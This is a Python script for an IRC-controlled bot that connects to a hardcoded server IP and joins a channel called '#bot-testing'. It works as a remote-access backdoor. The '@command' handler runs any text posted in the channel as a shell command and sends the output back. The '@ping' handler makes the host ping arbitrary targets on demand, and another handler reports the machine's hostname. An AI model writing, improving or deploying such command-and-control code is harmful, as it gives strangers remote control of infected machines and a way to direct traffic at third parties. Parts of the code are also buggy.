#!/usr/bin/python3
import platform    # For getting the operating system name
import subprocess  # For executing a shell command
import socket
import os
from time import time,sleep
ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
def pong(): # respond to server Pings.
    ircsock.send("PONG :pingisn");

def connect():
    server = "75.90.61.240"; # Enter your Server IP
    channel = "#bot-testing"; # Channel
    botnick = "B0t-Windows"; # Your bots nick
    ircsock.connect((server, 6667)); # Here we connect to the server using the port 6667

    sendstr = "USER "+botnick+" "+botnick+" "+botnick+" :Python B0t1.!! Testing Case\r\n";
    ircsock.sendall((sendstr).encode('utf-8'));

    ircsock.sendall(("NICK "+ botnick +"\r\n").encode('utf-8')) # assign the nick to the bot

    while 1: #this while block is for ping-pong IRC responses (NOT IMPORTANT BUT READ THE IRC PROTOCOL TO UNDERSTAND THE PORT)
        ircmsg = ircsock.recv(2048).decode("utf-8")
        print (ircmsg);
        if ircmsg.find ( 'PING' ) != -1:
            ircsock.sendall(( 'PONG ' + ircmsg.split() [ 1 ] + '\r\n' ).encode('utf-8'))
            last_ping = time()
            break;

def joinchan(chan): # join channel(s).
    print("JOINING")
    ircsock.sendall(("JOIN "+chan+"\r\n").encode('utf-8'))
    ircmsg = ""
    while 1:
        ircmsg = ircsock.recv(2048).decode("utf-8")
        ircmsg = ircmsg.strip("\n\r")
        print(ircmsg)
        if ircmsg.find ( 'PING' ) != -1:
            ircsock.sendall(( 'PONG ' + ircmsg.split() [ 1 ] + '\r\n' ).encode('utf-8'))
            last_ping = time()
        if ircmsg.lower().find(":@hi") != -1:
            ircsock.send(("PRIVMSG " + chan +" :Hello!\r\n" ).encode('utf-8'))
        if ircmsg.lower().find(":@command") != -1:
            cmd = ircmsg.lower()[ircmsg.lower().find(":@command")+10:len(str(ircmsg))];
            stream = os.popen(cmd)
            output = stream.read()
            ircsock.sendall(("PRIVMSG " + chan + " :"+output+'\r'+'\n').encode('utf-8'));
        if ircmsg.lower().find(":@message") != -1:
            cmd = ircmsg.lower()[ircmsg.lower().find(":@message")+10:len(str(ircmsg))];
            ircsock.sendall(("PRIVMSG " + chan + " :"+cmd+'\r'+'\n').encode('utf-8'))
        if ircmsg.lower().find(":@ping") != -1:
            cmd = ircmsg.lower()[ircmsg.lower().find(":@ping")+7:len(str(ircmsg))];
           # ircsock.sendall(("PRIVMSG " + chan + " :"+cmd+'\r'+'\n').encode('utf-8'))
            callPing(cmd, ircsock)
        if ircmsg.lower().find(":@name") != -1:
            osVal = getOS()
            osVal = osVal.decode('utf-8')
            ircsock.sendall(("PRIVMSG " + chan + " :"+osVal+'\r'+'\n').encode('utf-8'))
        if ircmsg.lower().find(":@exit") != -1:
            ircsock.shutdown(socket.SHUT_RDWR)

def getOS():
    if(platform.system().lower()=='linux'):
        command = ['cat','/proc/sys/kernel/hostname']
    elif(platform.system().lower()=='windows'):
        command = ['hostname']
    return subprocess.check_output(command)
def callPing(host, sock):
    param = '-n' if platform.system().lower()=='windows' else '-c'
    argArray = host.split() #[address, number of times to loop]
    command = ['ping', param, '1', argArray[0]]
    if(int(argArray[1])>1):
        ircsock.sendall(("PRIVMSG " + chan + " :"+"Pinging " + argArray[0] + " " + argArray[1] + " times....."+'\r'+'\n').encode('utf-8'))
    elif(int(argArray[1])==1):
        ircsock.sendall(("PRIVMSG " + chan + " :"+"Pinging " + argArray[0] + " " + argArray[1] + " time....."+'\r'+'\n').encode('utf-8'))
    else:
        return
    for i in range(int(argArray[1])):
        print(i)
        subprocess.call(command)
    return 

chan = '#bot-testing'

connect()
#sleep(10);
joinchan('#bot-testing')
